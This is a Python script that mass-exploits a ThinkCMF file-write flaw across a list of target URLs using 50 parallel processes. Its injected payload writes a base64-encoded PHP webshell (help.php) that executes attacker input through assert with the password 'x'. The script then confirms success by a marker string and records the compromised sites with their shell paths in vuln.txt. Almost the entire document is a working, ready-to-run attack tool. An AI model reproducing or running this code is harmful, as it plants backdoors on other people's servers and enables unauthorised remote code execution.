#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import urllib3
urllib3.disable_warnings()
from multiprocessing import Pool


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
}



payload = '/index.php?a=fetch&content=<?=file_put_contents("help.php",base64_decode("PD9waHAgZnVuY3Rpb24gc3Fsc2VjKCRhKXskYSgkX1JFUVVFU1RbJ3gnXSk7fXNxbHNlYyhhc3NlcnQpOyRhPSJmdWNrZnVja2Z1Y2siO2VjaG8gJGE7=="));exit();?>'

def poc(url):
    urls=url
    try:
        r = requests.get(url=urls + payload, headers=headers, verify=False)
        a = requests.get(url=urls + "/help.php", headers=headers, allow_redirects=False, verify=False)
        if a.status_code == 200 and r.status_code != 302 and "fuckfuckfuck" in a.text:
            print("Thinkcmf文件写入", url + "/help.php")
            with open("vuln.txt",'a+') as f:
                f.write(f"{url}|存在ThinkCMF文件写入密码是x-{url}/help.php")
                f.close()
        else:
            pass
    except EOFError as e:
	    print(e)

if __name__ == '__main__':
	p = Pool(50)
	URLS=[]
	for i in open("url.txt",encoding='utf-8'):
		URLS.append(i.strip('\n'))
	for k in URLS:
		p.apply_async(poc,args=(k,))
	p.close()
	p.join()